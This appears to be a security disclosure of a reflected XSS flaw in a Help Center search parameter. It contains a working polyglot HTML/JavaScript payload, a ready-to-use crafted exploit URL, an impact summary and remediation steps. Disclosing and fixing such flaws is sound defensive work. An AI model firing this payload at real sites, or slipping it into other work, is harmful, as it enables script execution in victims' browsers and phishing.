## Title
Reflected XSS - Search Filter

## Description
The application is vulnerable to Reflected Cross-Site Scripting (XSS) through the `search` parameter on the Help Center search page. User-controlled input is reflected in the search results without proper output encoding, allowing injected HTML and JavaScript to execute in the browser.

During testing, an HTML injection payload containing multiple closing tags and an image element with an `onerror` event handler was submitted. The browser executed the event handler and displayed a JavaScript confirmation dialog, demonstrating successful reflected XSS.

**Affected URL:** https://tracking.pwnedbox.site/

## Steps to Reproduce
1. Open the affected Help Center search page.
2. Insert the provided payload into the `search` parameter.
3. Open the crafted URL in the browser.
4. Observe the JavaScript confirmation dialog displaying `1`.

## POC (Proof of Concept)
**HTTP Method:** GET

**Vulnerable Parameter:** `search`

**Payload:**
```html
'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
```

**Crafted URL:**
```text
https://tracking.pwnedbox.site/?search=%27%22%3C%21--%3E%29%3C%2FTitle%2F%3C%2Fh1%2F%3C%2Fh2%2F%3C%2Fh3%2F%3C%2Fh4%2F%3C%2Fdiv%2F%3C%2Fp%2F%3C%2Fa%2F%3C%2Ffont%2F%3C%2Flabel%2F%3C%2Fbutton%2F%3C%2Fimg%2F%3C%2Ful%2F%3C%2Fol%2F%3C%2Fli%2F%3C%2Foption%2F%3C%2Fspan%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%3CImg%20Src%3DOnXSS%20OnError%3D%28confirm%29%281%29%3E
```

**Observed Result:**
After opening the crafted URL, the application reflected the supplied input in the search results. The injected image element triggered its `onerror` event handler, causing a JavaScript confirmation dialog displaying `1` with OK and Cancel options. This confirms successful JavaScript execution through the `search` parameter.

**Screenshot Evidence:**

1. Crafted payload reflected in the Help Center search results.
   <img width="1917" height="963" alt="image" src="https://github.com/user-attachments/assets/b2502bf5-ac07-4cd5-98ce-66dec04463fb" />

2. JavaScript confirmation dialog displaying `1`.
   <img width="1914" height="965" alt="image" src="https://github.com/user-attachments/assets/d20cd2bc-5909-47a8-b441-8465769f7079" />

## Impact
An attacker could create a crafted URL and trick users into opening it. Successful exploitation could result in JavaScript execution within the application's origin.

- Execution of attacker-controlled JavaScript in a victim's browser.
- Phishing through manipulated page content.
- Potential unauthorized actions within an authenticated session, depending on application protections.
- Misuse of the trusted application origin to present malicious content.

## Remediation
1. Apply context-aware output encoding to the `search` parameter before displaying its value.
2. Sanitize user input and prevent untrusted HTML elements and event handlers from being rendered.
3. Avoid inserting user-controlled input directly into HTML.
4. Implement a restrictive Content Security Policy (CSP) to reduce the impact of script injection.
